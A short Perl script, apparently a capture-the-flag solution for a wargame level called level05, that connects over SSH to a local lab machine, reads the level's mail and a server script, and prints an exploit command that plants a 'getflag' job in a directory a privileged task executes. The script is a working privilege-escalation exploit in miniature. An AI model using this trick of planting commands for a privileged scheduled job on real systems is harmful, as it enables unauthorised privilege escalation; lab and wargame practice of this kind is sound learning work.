#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level05";

$inject = "cat /var/mail/level05 && cat /usr/sbin/openarenaserver";
$exploit = "Exploit :\nssh -qp $port $user\@$ip\necho 'getflag | write level05' > /opt/openarenaserver/flag";
print $red, $inject, $reset, "\n";
system("ssh -qp $port $user\@$ip '$inject'");
print $green, $exploit, $reset, "\n";
